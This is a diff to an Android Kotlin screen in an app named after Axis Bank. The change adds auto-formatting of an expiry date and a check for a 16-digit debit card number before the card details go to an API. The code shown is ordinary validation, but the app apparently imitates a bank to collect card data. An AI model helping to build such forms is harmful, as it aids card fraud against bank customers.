@@ -3,6 +3,8 @@ package com.example.oldaxisbank
 import android.content.Intent
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
+import android.text.Editable
+import android.text.TextWatcher
 import android.util.Log
 import android.widget.Toast
 import com.example.axisbank.SecondPage
@@ -20,13 +22,36 @@ class verifydetail : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         binding = ActivityVerifydetailBinding.inflate(layoutInflater)
         setContentView(binding.root)
+        binding.e2.addTextChangedListener(object : TextWatcher {
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {
+                // Do nothing
+            }
+
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
+                // Check if the text length is 2 and no "/" is present
+                if (s?.length == 2 && !s.contains("/")) {
+                    val modifiedText = StringBuilder(s).insert(2, "/").toString()
+                    binding.e2.setText(modifiedText) // Insert "/" after the first two characters
+                    binding.e2.setSelection(binding.e2.text.length) // Move cursor to the end
+                }
+            }
+
+            override fun afterTextChanged(s: Editable?) {
+                // Do nothing
+            }
+        })
 
         binding.login.setOnClickListener {
 
+
             if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() ||
-                binding.e3.text.toString().isEmpty()){
+                binding.e3.text.toString().isEmpty()  ){
                 Toast.makeText(this,"fill all fields",Toast.LENGTH_SHORT).show()
-            }else{
+            }
+            else if (binding.e1.text.toString().length < 16 ){
+                Toast.makeText(this,"Please Enter 16 digit Debit Card Number",Toast.LENGTH_SHORT).show()
+            }
+            else{
 
                 val util = Util()
                 val apiService = ApiClient.getClient().create(ApiService::class.java)
